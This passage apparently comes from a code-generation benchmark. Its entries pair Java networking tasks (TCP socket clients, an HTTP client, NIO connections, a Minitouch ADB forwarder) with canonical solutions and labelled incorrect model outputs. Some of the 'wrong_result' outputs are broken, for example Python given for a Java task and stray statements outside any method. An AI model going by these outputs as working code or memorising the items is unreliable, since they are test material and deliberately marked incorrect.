    "wrong_result": "public class Minitouch {\n    private static final String REMOTE_PATH = \"/data/local/tmp\";\n    private static final String MINITOUCH_BIN = \"minitouch\";\n    private List<MinitouchListener> listenerList;\n    private AdbDevice device;\n    private Socket minitouchSocket;\n    private OutputStream minitouchOutputStream;\n    private AdbForward forward;\n\n    public Minitouch(AdbDevice device) {\n        this.device = device;\n        this.listenerList = new ArrayList<>();\n    }\n\n    public void addEventListener(MinitouchListener listener) {\n        listenerList.add(listener);\n    }\n\n    public void start() {\n        try {\n            forward = createForward();\n            startInitialThread(\"localhost\", forward.getLocalPort());\n        } catch (Exception e) {\n            onStartup(false);\n        }\n    }\n\n    public void kill() {\n        try {\n            if (minitouchSocket != null && !minitouchSocket.isClosed()) {\n                minitouchSocket.close();\n            }\n            if (minitouchOutputStream != null) {\n                minitouchOutputStream.close();\n            }\n            removeForward(forward);\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            onClose();\n        }\n    }\n\n    public void sendEvent(String str) {\n        try {\n            minitouchOutputStream.write(str.getBytes());\n            minitouchOutputStream.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private AdbForward createForward() throws Exception {\n        return device.forward(\"localabstract:minitouch\", REMOTE_PATH + \"/\" + MINITOUCH_BIN);\n    }\n\n    private void removeForward(AdbForward forward) {\n        device.removeForward(forward);\n    }\n\n    private void startInitialThread(String host, int port) {\n        new Thread(() -> {\n            try {\n                minitouchSocket = new Socket(host, port);\n                minitouchOutputStream = minitouchSocket.getOutputStream();\n                onStartup(true);\n            } catch (IOException e) {\n                onStartup(false);\n            }\n        }).start();\n    }\n\n    private void onStartup(boolean success) {\n        for (MinitouchListener listener : listenerList) {\n            if (success) {\n                listener.onConnect();\n            } else {\n                listener.onConnectFailed();\n            }\n        }\n    }\n\n    private void onClose() {\n        for (MinitouchListener listener : listenerList) {\n            listener.onDisconnect();\n        }\n    }\n\n    private AdbForward generateForwardInfo() {\n        return device.forward(\"localabstract:minitouch\", REMOTE_PATH + \"/\" + MINITOUCH_BIN);\n    }\n}"
  },
  {
    "Task_id": 419,
    "Instruction": "Task Description: Create a Java class that implements a TCP client for voice communication, handling both input and output streams for audio data transmission.\n\nClass Description: The VoiceClient class extends Thread to create a TCP client that connects to a voice server. It manages audio stream connections, handles data transmission, and provides methods for connection management.\n\nAttributes:\n- format: AudioFormat - The audio format configuration for the voice data\n- outputThread: VoiceOutput - Thread handling outgoing voice data\n- inputThread: VoiceInput - Thread handling incoming voice data\n- output: DataOutputStream - Output stream for sending data to server\n- input: DataInputStream - Input stream for receiving data from server\n- running: boolean - Flag indicating if the client is active\n- socket: Socket - The TCP socket connection\n- ip: String - The IP address of the server to connect to\n\nMethods:\n- VoiceClient(String ip) -> None - Constructor that initializes the client with server IP\n- run() -> None - Main thread method that establishes connection and starts I/O threads\n- disconnect() -> None - Closes all connections and stops the client\n- isRunning() -> boolean - Returns the running status of the client\n- getOutputStream() -> DataOutputStream - Returns the output stream\n- getInputStream() -> DataInputStream - Returns the input stream\n- getAudioFormat() -> AudioFormat - Returns the audio format configuration",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.ConnectException;\nimport java.net.Socket;\nimport javax.sound.sampled.AudioFormat;\n\npublic class VoiceClient extends Thread {\n\n    private final AudioFormat format = new AudioFormat(16_000F, 16, 1, true, true);\n    private VoiceOutput outputThread;\n    private VoiceInput inputThread;\n    private DataOutputStream output;\n    private DataInputStream input;\n    private boolean running;\n    private Socket socket;\n    private final String ip;\n\n    public VoiceClient(String ip) {\n        super(\"VoiceServer Client Thread \" + ip);\n        this.ip = ip;\n        setDaemon(true);\n    }\n\n    @Override\n    public void run() {\n        try {\n            socket = new Socket(ip, MekanismAdditionsConfig.additions.voicePort.get());\n            running = true;\n\n            input = new DataInputStream(new BufferedInputStream(socket.getInputStream()));\n            output = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));\n\n            (outputThread = new VoiceOutput(this)).start();\n            (inputThread = new VoiceInput(this)).start();\n        } catch (ConnectException e) {\n        } catch (Exception e) {\n        }\n    }\n\n    public void disconnect() {\n        try {\n            if (inputThread != null) {\n                inputThread.interrupt();\n                inputThread.close();\n            }\n            if (outputThread != null) {\n                outputThread.interrupt();\n                outputThread.close();\n            }\n            if (output != null) {\n                output.close();\n            }\n            if (input != null) {\n                input.close();\n            }\n            if (socket != null) {\n                socket.close();\n            }\n\n            interrupt();\n\n            running = false;\n        } catch (Exception e) {\n        }\n    }\n\n    public boolean isRunning() {\n        return running;\n    }\n\n    public DataOutputStream getOutputStream() {\n        return output;\n    }\n\n    public DataInputStream getInputStream() {\n        return input;\n    }\n\n    public AudioFormat getAudioFormat() {\n        return format;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class VoiceClient extends Thread {\n    private AudioFormat format;\n    private VoiceOutput outputThread;\n    private VoiceInput inputThread;\n    private DataOutputStream output;\n    private DataInputStream input;\n    private boolean running;\n    private Socket socket;\n    private String ip;\n\n    public VoiceClient(String ip) {\n        this.ip = ip;\n        this.running = false;\n    }\n\n    @Override\n    public void run() {\n        try {\n            socket = new Socket(ip, 5000);\n            output = new DataOutputStream(socket.getOutputStream());\n            input = new DataInputStream(socket.getInputStream());\n            outputThread = new VoiceOutput(output, format);\n            inputThread = new VoiceInput(input, format);\n            outputThread.start();\n            inputThread.start();\n            running = true;\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void disconnect() {\n        running = false;\n        try {\n            if (output != null) output.close();\n            if (input != null) input.close();\n            if (socket != null) socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public boolean isRunning() {\n        return running;\n    }\n\n    public DataOutputStream getOutputStream() {\n        return output;\n    }\n\n    public DataInputStream getInputStream() {\n        return input;\n    }\n\n    public AudioFormat getAudioFormat() {\n        return format;\n    }\n}"
  },
  {
    "Task_id": 42,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for making various types of HTTP requests and handling responses.\n\nClass Description: The HttpCommunicationClient class provides methods for performing HTTP operations (GET, POST) and handling redirects. It manages an HTTP client instance and supports custom headers and browser-like requests.\n\nAttributes:\naddress: [InetSocketAddress] - The target server address (host and port) for HTTP requests\nhttpClient: [HttpClient] - The underlying HTTP client instance used for making requests\n\nMethods:\nsetupHttpClient: [setupHttpClient(ThreadPool threadPool)] -> [void] - Initializes the HTTP client with redirect policy and thread pool\ncloseClient: [closeClient()] -> [void] - Closes the HTTP client resources\nexecuteAndDefaultAssertions: [executeAndDefaultAssertions(HttpRequest request)] -> [HttpResponse<String>] - Internal method to execute requests and handle responses\nget: [get(String path, String[]... headers)] -> [HttpResponse<String>] - Performs a GET request to specified path with optional headers\nbrowserGet: [browserGet(String uri)] -> [HttpResponse<String>] - Performs a GET request with browser-like User-Agent header\npost: [post(String path)] -> [HttpResponse<String>] - Performs a POST request to specified path\ngetAllRedirectLocations: [getAllRedirectLocations(String path, String[]... headers)] -> [List<String>] - Retrieves all redirect locations for a request\nbrowserHeader: [static browserHeader()] -> [String[]] - Returns browser-like User-Agent header (static utility method)",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpClient.Redirect;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpRequest.BodyPublishers;\nimport java.net.http.HttpRequest.Builder;\nimport java.net.http.HttpResponse;\nimport java.net.http.HttpResponse.BodyHandlers;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class HttpCommunicationClient {\n\n    protected InetSocketAddress address;\n    protected HttpClient httpClient;\n\n    public void setupHttpClient(ThreadPool threadPool) {\n        httpClient = HttpClient.newBuilder()\n            .followRedirects(Redirect.NORMAL)\n            .executor(threadPool.generic())\n            .build();\n    }\n\n    public void closeClient() {\n        httpClient.close();\n    }\n\n    private HttpResponse<String> executeAndDefaultAssertions(HttpRequest request) throws Exception {\n        var resp = httpClient.send(request, BodyHandlers.ofString());\n        return resp;\n    }\n\n    public HttpResponse<String> get(String path, String[] ... headers) throws Exception {\n        URI uri = URI.create(String.format(\"http://%s:%s%s\", address.getHostName(), address.getPort(), path));\n        Builder builder = HttpRequest.newBuilder(uri);\n        for (String[] header : headers) {\n            builder.header(header[0], header[1]);\n        }\n        return executeAndDefaultAssertions(builder.build());\n    }\n\n    public HttpResponse<String> browserGet(String uri) throws Exception {\n        return get(uri, browserHeader());\n    }\n\n    public HttpResponse<String> post(String path) throws Exception {\n        URI uri = URI.create(String.format(\"http://%s:%s%s\", address.getHostName(), address.getPort(), path));\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .POST(BodyPublishers.noBody())\n            .build();\n        return executeAndDefaultAssertions(request);\n    }\n\n    public List<String> getAllRedirectLocations(String path, String[] ... headers) throws Exception {\n        URI uri = URI.create(String.format(\"http://%s:%s%s\", address.getHostName(), address.getPort(), path));\n        Builder builder = HttpRequest.newBuilder(uri);\n        for (String[] header : headers) {\n            builder.header(header[0], header[1]);\n        }\n        var response = httpClient.send(builder.build(), BodyHandlers.discarding());\n        response = response.previousResponse().orElse(null);\n        List<String> redirects = new ArrayList<>();\n        while (response != null) {\n            redirects.addAll(response.headers().allValues(\"location\"));\n            response = response.previousResponse().orElse(null);\n        }\n        return redirects;\n    }\n\n    static String[] browserHeader() {\n        return new String[] {\n            \"User-Agent\",\n            \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36\"\n        };\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "public class HttpCommunicationClient {\n    private InetSocketAddress address;\n    private HttpClient httpClient;\n\n    public HttpCommunicationClient(InetSocketAddress address) {\n        this.address = address;\n    }\n\n    public void setupHttpClient(ThreadPool threadPool) {\n        HttpClient.Builder builder = HttpClient.newBuilder()\n                .version(HttpClient.Version.HTTP_2)\n                .executor(threadPool.getExecutor())\n                .followRedirects(HttpClient.Redirect.NORMAL);\n        this.httpClient = builder.build();\n    }\n\n    public void closeClient() {\n        if (httpClient != null) {\n            httpClient.close();\n        }\n    }\n\n    protected HttpResponse<String> executeAndDefaultAssertions(HttpRequest request) throws IOException, InterruptedException {\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> get(String path, String[]... headers) throws IOException, InterruptedException {\n        HttpRequest.Builder requestBuilder = HttpRequest.newBuilder()\n                .uri(URI.create(\"http://\" + address.getHostString() + \":\" + address.getPort() + path))\n                .GET();\n        if (headers != null) {\n            for (String[] header : headers) {\n                if (header.length == 2) {\n                    requestBuilder.header(header[0], header[1]);\n                }\n            }\n        }\n        return executeAndDefaultAssertions(requestBuilder.build());\n    }\n\n    public HttpResponse<String> browserGet(String uri) throws IOException, InterruptedException {\n        String[] browserHeader = browserHeader();\n        return get(uri, browserHeader);\n    }\n\n    public HttpResponse<String> post(String path) throws IOException, InterruptedException {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(\"http://\" + address.getHostString() + \":\" + address.getPort() + path))\n                .POST(HttpRequest.BodyPublishers.noBody())\n                .build();\n        return executeAndDefaultAssertions(request);\n    }\n\n    public List<String> getAllRedirectLocations(String path, String[]... headers) throws IOException, InterruptedException {\n        List<String> redirectLocations = new ArrayList<>();\n        HttpRequest.Builder requestBuilder = HttpRequest.newBuilder()\n                .uri(URI.create(\"http://\" + address.getHostString() + \":\" + address.getPort() + path))\n                .GET();\n        if (headers != null) {\n            for (String[] header : headers) {\n                if (header.length == 2) {\n                    requestBuilder.header(header[0], header[1]);\n                }\n            }\n        }\n        HttpResponse<String> response = httpClient.send(requestBuilder.build(), HttpResponse.BodyHandlers.ofString());\n        int statusCode = response.statusCode();\n        if (statusCode >= 300 && statusCode < 400) {\n            String location = response.headers().firstValue(\"Location\").orElse(null);\n            if (location != null) {\n                redirectLocations.add(location);\n                if (location.startsWith(\"http\")) {\n                    HttpResponse<String> redirectResponse = httpClient.send(HttpRequest.newBuilder().uri(URI.create(location)).GET().build(), HttpResponse.BodyHandlers.ofString());\n                    redirectLocations.addAll(getAllRedirectLocations(location, headers));\n                }\n            }\n        }\n        return redirectLocations;\n    }\n\n    public static String[] browserHeader() {\n        return new String[]{\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\"};\n    }\n}"
  },
  {
    "Task_id": 422,
    "Instruction": "Task Description: Create a function that sends a string to a server using TCP socket communication.\n\nFunction Description: The function establishes a TCP connection to a specified server and port, sends a string message, then closes the connection. It handles potential IO exceptions by printing formatted error information.\n\nInput: \n- str: String - The message to be sent to the server\n\nOutput: None (The function doesn't return any value, but sends data to the server and may print error information to stderr)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.Arrays;\n\npublic static void socketSend(String str) {\n    try {\n        Socket socket = new Socket(\"127.0.0.1\", 5327);\n        OutputStream out = socket.getOutputStream();\n        out.write(str.getBytes());\n        out.close();\n    } catch (IOException e) {\n        System.err.println(e.toString()+\"\\n\"+ Arrays.toString(e.getStackTrace())\n                .replace(\"[\",\"   at \")\n                .replace(\",\",\"\\n   at\")\n                .replace(\"]\",\"\"));\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "```python\nimport socket\n\ndef send_tcp_message(message):\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((\"localhost\", 12345))\n            s.sendall(message.encode())\n    except socket.error as e:\n        print(f\"Socket error: {e}\", file=sys.stderr)\n    except Exception as e:\n        print(f\"Unexpected error: {e}\", file=sys.stderr)\n```"
  },
  {
    "Task_id": 423,
    "Instruction": "Task Description: Create a Java function that establishes a TCP client connection to a server, sends HTTP upgrade requests and echo messages, and verifies server responses.\n\nFunction Description: The function connects to a predefined server using TCP, sends an HTTP upgrade request followed by echo messages, and asserts the correctness of server responses. It handles basic client-server communication including connection establishment, data exchange, and connection termination.\n\nInput: \n- url: String - The URL path to be used in the HTTP GET request\n\nOutput: \n- None (void) - The function performs assertions to verify server responses but doesn't return any value. It throws IOException if any network communication fails.\n\nNote: The function uses predefined host address and port from DefaultServer class, and includes a helper method readBytes() (not shown) to read data from the input stream.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic void runTest(final String url) throws IOException {\n    final Socket socket = new Socket(DefaultServer.getHostAddress(\"default\"), DefaultServer.getHostPort(\"default\"));\n\n    InputStream in = socket.getInputStream();\n    OutputStream out = socket.getOutputStream();\n    out.write((\"GET \" + url + \" HTTP/1.1\\r\\nHost:default\\r\\nConnection: upgrade\\r\\nUpgrade: servlet\\r\\n\\r\\n\").getBytes());\n    out.flush();\n    Assert.assertTrue(readBytes(in).startsWith(\"HTTP/1.1 101 Switching Protocols\\r\\n\"));\n\n    out.write(\"Echo Messages\\r\\n\\r\\n\".getBytes());\n    out.flush();\n    Assert.assertEquals(\"Echo Messages\\r\\n\\r\\n\", readBytes(in));\n\n    out.write(\"Echo Messages2\\r\\n\\r\\n\".getBytes());\n    out.flush();\n    Assert.assertEquals(\"Echo Messages2\\r\\n\\r\\n\", readBytes(in));\n\n    out.write(\"exit\\r\\n\\r\\n\".getBytes());\n    out.flush();\n    out.close();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nvoid sendHttpUpgradeAndEcho(String url) throws IOException {\n    String host = DefaultServer.HOST;\n    int port = DefaultServer.PORT;\n    try (Socket socket = new Socket(host, port);\n         PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n         BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {\n        String request = \"GET \" + url + \" HTTP/1.1\\r\\nHost: \" + host + \"\\r\\nConnection: Upgrade\\r\\nUpgrade: websocket\\r\\n\\r\\n\";\n        out.print(request);\n        String response = in.readLine();\n        assert response != null && response.contains(\"101 Switching Protocols\");\n        out.println(\"Hello, Server!\");\n        String echoResponse = in.readLine();\n        assert echoResponse != null && echoResponse.equals(\"Hello, Server!\");\n    }\n}\n```"
  },
  {
    "Task_id": 425,
    "Instruction": "Task Description: Create a function that establishes a TCP connection to a server, sends JSON-formatted measurement data, and then closes the connection.\n\nFunction Description: The function `doSocketTest` establishes a TCP socket connection to a specified server (localhost) on a predefined port. It generates JSON-formatted measurement data using a helper class, writes this data to the server through the socket's output stream, flushes the stream to ensure all data is sent, and then closes both the output stream and the socket to release resources.\n\nInput: \n- None (The function uses predefined constants `SERVER_SOCKET_PORT` and `HARDWARE_ID` for server port and hardware identification, respectively.)\n\nOutput: \n- None (The function does not return any value but sends data to the server and may throw exceptions if the connection or data transmission fails.)",
    "Canonical_solution": "import java.net.Socket;\n\npublic void doSocketTest() throws Exception {\n    Socket socket = new Socket(\"localhost\", SERVER_SOCKET_PORT);\n    byte[] encoded = EventsHelper.generateJsonMeasurementsMessage(HARDWARE_ID);\n    socket.getOutputStream().write(encoded);\n    socket.getOutputStream().flush();\n    socket.getOutputStream().close();\n    socket.close();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\npublic void doSocketTest() {\n    try (Socket socket = new Socket(\"localhost\", SERVER_SOCKET_PORT)) {\n        JSONObject measurementData = new JSONObject();\n        measurementData.put(\"hardwareId\", HARDWARE_ID);\n        measurementData.put(\"temperature\", 25.5);\n        measurementData.put(\"humidity\", 60);\n        \n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(measurementData.toString().getBytes());\n        outputStream.flush();\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n}\n```"
  },
  {
    "Task_id": 426,
    "Instruction": "Task Description: Implement a Java class that provides TCP client functionality using Java NIO (Non-blocking I/O) for efficient network communication. The class should support both plaintext and SSL connections, manage multiple connections, and handle connection lifecycle operations.\n\nClass Description: The NioTcpClient class is a non-blocking TCP client implementation using Java NIO. It manages multiple socket connections, handles connection establishment, and provides methods for connection management. It supports both plaintext and SSL connections through a configurable transmission mechanism.\n\nAttributes:\n- nioSelector: Selector - The NIO selector used for managing multiple channels\n- keyMap: Map<String, SelectionKey> - Maps connection IDs to their corresponding selection keys\n- time: Time - Provides time-related functionality\n- sslFactory: SSLFactory - Handles SSL-related operations if SSL connections are used\n- networkConfig: NetworkConfig - Contains network configuration parameters\n\nMethods:\n- NioTcpClient(Time, SSLFactory, NetworkConfig) -> NioTcpClient - Constructor that initializes the selector, time, SSL factory, and network configuration\n- connect(InetSocketAddress, int, int, PortType) -> String - Establishes a new connection to the specified address with given buffer sizes and port type, returns a connection ID\n- generateConnectionId(SocketChannel) -> String - Generates a unique connection ID based on local and remote socket addresses\n- createTransmission(String, SelectionKey, String, int, PortType, SSLFactory.Mode) -> Transmission - Creates an appropriate transmission object (plaintext or SSL) for the connection\n- disconnect(String) -> void - Disconnects the connection with the specified ID\n- close() -> void - Closes all connections and releases all resources",
    "Canonical_solution": "import com.github.ambry.network.NetworkSend;\nimport com.github.ambry.network.NetworkReceive;\nimport com.github.ambry.network.PortType;\nimport com.github.ambry.commons.SSLFactory;\nimport com.github.ambry.config.NetworkConfig;\nimport com.github.ambry.utils.Time;\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class NioTcpClient {\n\n  private final java.nio.channels.Selector nioSelector;\n  private final Map<String, SelectionKey> keyMap;\n  private final Time time;\n  private final SSLFactory sslFactory;\n  private final NetworkConfig networkConfig;\n\n  public NioTcpClient(Time time, SSLFactory sslFactory, NetworkConfig networkConfig) throws IOException {\n    this.nioSelector = java.nio.channels.Selector.open();\n    this.time = time;\n    this.keyMap = new HashMap<>();\n    this.sslFactory = sslFactory;\n    this.networkConfig = networkConfig;\n  }\n\n  public String connect(InetSocketAddress address, int sendBufferSize, int receiveBufferSize, PortType portType)\n      throws IOException {\n    SocketChannel channel = SocketChannel.open();\n    channel.configureBlocking(false);\n    channel.socket().setKeepAlive(true);\n    channel.socket().setSendBufferSize(sendBufferSize);\n    channel.socket().setReceiveBufferSize(receiveBufferSize);\n    channel.socket().setTcpNoDelay(true);\n    try {\n      channel.connect(address);\n    } catch (IOException e) {\n      channel.close();\n      throw e;\n    }\n    String connectionId = generateConnectionId(channel);\n    SelectionKey key = channel.register(this.nioSelector, SelectionKey.OP_CONNECT);\n    Transmission transmission = createTransmission(connectionId, key, address.getHostName(), address.getPort(), portType,\n        SSLFactory.Mode.CLIENT);\n    key.attach(transmission);\n    this.keyMap.put(connectionId, key);\n    return connectionId;\n  }\n\n  private String generateConnectionId(SocketChannel channel) {\n    return channel.socket().getLocalAddress().getHostAddress() + \":\" + channel.socket().getLocalPort() + \"-\" +\n        channel.socket().getInetAddress().getHostAddress() + \":\" + channel.socket().getPort();\n  }\n\n  protected Transmission createTransmission(String connectionId, SelectionKey key, String hostname, int port,\n      PortType portType, SSLFactory.Mode mode) throws IOException {\n    if (portType == PortType.PLAINTEXT) {\n      return new PlainTextTransmission(connectionId, (SocketChannel) key.channel(), key, time, null, networkConfig);\n    } else if (portType == PortType.SSL) {\n      return new SSLTransmission(sslFactory, connectionId, (SocketChannel) key.channel(), key, hostname, port, time,\n          null, mode, networkConfig);\n    } else {\n      throw new IllegalArgumentException(\"Unsupported portType \" + portType);\n    }\n  }\n\n  public void disconnect(String connectionId) {\n    SelectionKey key = this.keyMap.get(connectionId);\n    if (key != null) {\n      key.cancel();\n    }\n  }\n\n  public void close() throws IOException {\n    for (SelectionKey key : this.nioSelector.keys()) {\n      Transmission transmission = (Transmission) key.attachment();\n      if (transmission != null) {\n        transmission.close();\n      }\n      key.channel().close();\n    }\n    this.nioSelector.close();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "nioSelector = Selector.open();\nkeyMap = new HashMap<>();\nthis.time = time;\nthis.sslFactory = sslFactory;\nthis.networkConfig = networkConfig;\n\npublic NioTcpClient(Time time, SSLFactory sslFactory, NetworkConfig networkConfig) throws IOException {\n    this.nioSelector = Selector.open();\n    this.keyMap = new HashMap<>();\n    this.time = time;\n    this.sslFactory = sslFactory;\n    this.networkConfig = networkConfig;\n}\n\npublic String connect(InetSocketAddress address, int readBufferSize, int writeBufferSize, PortType portType) throws IOException {\n    SocketChannel socketChannel = SocketChannel.open();\n    socketChannel.configureBlocking(false);\n    socketChannel.connect(address);\n    SelectionKey key = socketChannel.register(nioSelector, SelectionKey.OP_CONNECT);\n    key.attach(new ConnectionContext(readBufferSize, writeBufferSize, portType));\n    String connectionId = generateConnectionId(socketChannel);\n    keyMap.put(connectionId, key);\n    return connectionId;\n}\n\nprivate String generateConnectionId(SocketChannel socketChannel) {\n    InetSocketAddress remoteAddress = (InetSocketAddress) socketChannel.getRemoteAddress();\n    InetSocketAddress localAddress = (InetSocketAddress) socketChannel.getLocalAddress();\n    return String.format(\"%s:%d-%s:%d\", localAddress.getAddress().getHostAddress(), localAddress.getPort(), remoteAddress.getAddress().getHostAddress(), remoteAddress.getPort());\n}\n\nprivate Transmission createTransmission(String connectionId, SelectionKey key, String host, int port, PortType portType, SSLFactory.Mode mode) {\n    if (mode == SSLFactory.Mode.PLAINTEXT) {\n        return new PlaintextTransmission(connectionId, key, host, port, portType, networkConfig);\n    } else {\n        return new SslTransmission(connectionId, key, host, port, portType, sslFactory, networkConfig);\n    }\n}\n\npublic void disconnect(String connectionId) {\n    SelectionKey key = keyMap.get(connectionId);\n    if (key != null) {\n        key.cancel();\n        keyMap.remove(connectionId);\n    }\n}\n\npublic void close() throws IOException {\n    for (SelectionKey key : keyMap.values()) {\n        key.channel().close();\n    }\n    nioSelector.close();\n}"
  },
  {
    "Task_id": 427,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Java NIO (Non-blocking I/O) for efficient network communication. The class should handle connection establishment, data transmission, and connection termination while managing network buffers and packet processing.\n\nClass Description: TCPConnection is a non-blocking TCP client implementation that extends an abstract connection class and implements a packet source interface. It manages socket communication, handles I/O operations asynchronously, and processes network packets with proper flow control.\n\nAttributes:\n- MTU: [int] - Maximum Transmission Unit size (16384 bytes)\n- MAX_PAYLOAD_SIZE: [int] - Maximum payload size after accounting for protocol headers\n- clientToNetwork: [StreamBuffer] - Buffer for data being sent from client to network\n- networkToClient: [Packetizer] - Handles packetization of incoming data\n- packetForClient: [IPv4Packet] - Current packet being processed for the client\n- channel: [SocketChannel] - NIO channel for TCP communication\n- selectionKey: [SelectionKey] - Registration key with the selector\n- interests: [int] - Current interest set for the selection key\n\nMethods:\n- TCPConnection([ConnectionId id, Client client, Selector selector, IPv4Header ipv4Header, TCPHeader tcpHeader]) -> [void] - Constructor that initializes the connection with necessary headers and registers the channel with the selector\n- disconnect() -> [void] - Closes the connection and releases resources\n- processReceive() -> [void] - Handles incoming data from the network when readable\n- processSend() -> [void] - Handles outgoing data to the network when writable\n- createChannel() -> [SocketChannel] - Creates and configures the socket channel\n- sendToNetwork([IPv4Packet packet]) -> [void] - Sends a packet to the network\n- updateInterests() -> [void] - Updates the selector's interest ops based on current state\n- mayRead() -> [boolean] - Determines if the channel should be registered for read operations\n- mayWrite() -> [boolean] - Determines if the channel should be registered for write operations\n- mayConnect() -> [boolean] - Determines if the channel is in connecting state",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\n\npublic class TCPConnection extends AbstractConnection implements PacketSource {\n\n    private static final int MTU = 0x4000;\n    private static final int MAX_PAYLOAD_SIZE = MTU - 20 - 20;\n\n    private final StreamBuffer clientToNetwork = new StreamBuffer(4 * IPv4Packet.MAX_PACKET_LENGTH);\n    private final Packetizer networkToClient;\n    private IPv4Packet packetForClient;\n\n    private final SocketChannel channel;\n    private final SelectionKey selectionKey;\n    private int interests;\n\n    public TCPConnection(ConnectionId id, Client client, Selector selector, IPv4Header ipv4Header, TCPHeader tcpHeader) throws IOException {\n        super(id, client);\n\n        TCPHeader shrinkedTcpHeader = tcpHeader.copy();\n        shrinkedTcpHeader.shrinkOptions();\n\n        networkToClient = new Packetizer(ipv4Header, shrinkedTcpHeader);\n        networkToClient.getResponseIPv4Header().swapSourceAndDestination();\n        networkToClient.getResponseTransportHeader().swapSourceAndDestination();\n\n        SelectionHandler selectionHandler = (selectionKey) -> {\n            if (selectionKey.isValid() && selectionKey.isConnectable()) {\n                processConnect();\n            }\n            if (selectionKey.isValid() && selectionKey.isReadable()) {\n                processReceive();\n            }\n            if (selectionKey.isValid() && selectionKey.isWritable()) {\n                processSend();\n            }\n            updateInterests();\n        };\n        channel = createChannel();\n        interests = SelectionKey.OP_CONNECT;\n        selectionKey = channel.register(selector, interests, selectionHandler);\n    }\n\n    @Override\n    public void disconnect() {\n        selectionKey.cancel();\n        try {\n            channel.close();\n        } catch (IOException e) {\n        }\n    }\n\n    private void processReceive() {\n        try {\n            assert packetForClient == null;\n            int remainingClientWindow = getRemainingClientWindow();\n            assert remainingClientWindow > 0;\n            int maxPayloadSize = Math.min(remainingClientWindow, MAX_PAYLOAD_SIZE);\n            updateHeaders(TCPHeader.FLAG_ACK | TCPHeader.FLAG_PSH);\n            packetForClient = networkToClient.packetize(channel, maxPayloadSize);\n            if (packetForClient == null) {\n                eof();\n                return;\n            }\n            consume(this);\n        } catch (IOException e) {\n            resetConnection();\n        }\n    }\n\n    private void processSend() {\n        try {\n            int w = clientToNetwork.writeTo(channel);\n            if (w > 0) {\n                acknowledgementNumber += w;\n\n                if (finReceived && clientToNetwork.isEmpty()) {\n                    doHandleFin();\n                } else {\n                    sendEmptyPacketToClient(TCPHeader.FLAG_ACK);\n                }\n            } else {\n                close();\n            }\n        } catch (IOException e) {\n            resetConnection();\n        }\n    }\n\n    private SocketChannel createChannel() throws IOException {\n        SocketChannel socketChannel = SocketChannel.open();\n        socketChannel.configureBlocking(false);\n        socketChannel.connect(getRewrittenDestination());\n        return socketChannel;\n    }\n\n    @Override\n    public void sendToNetwork(IPv4Packet packet) {\n        handlePacket(packet);\n        updateInterests();\n    }\n\n    protected void updateInterests() {\n        if (!selectionKey.isValid()) {\n            return;\n        }\n        int interestOps = 0;\n        if (mayRead()) {\n            interestOps |= SelectionKey.OP_READ;\n        }\n        if (mayWrite()) {\n            interestOps |= SelectionKey.OP_WRITE;\n        }\n        if (mayConnect()) {\n            interestOps |= SelectionKey.OP_CONNECT;\n        }\n        if (interests != interestOps) {\n            interests = interestOps;\n            selectionKey.interestOps(interestOps);\n        }\n    }\n\n    private boolean mayRead() {\n        if (!state.isConnected() || state.isClosed()) {\n            return false;\n        }\n        if (packetForClient != null) {\n            return false;\n        }\n        return getRemainingClientWindow() > 0;\n    }\n\n    private boolean mayWrite() {\n        return !clientToNetwork.isEmpty();\n    }\n\n    private boolean mayConnect() {\n        return state == State.SYN_SENT;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
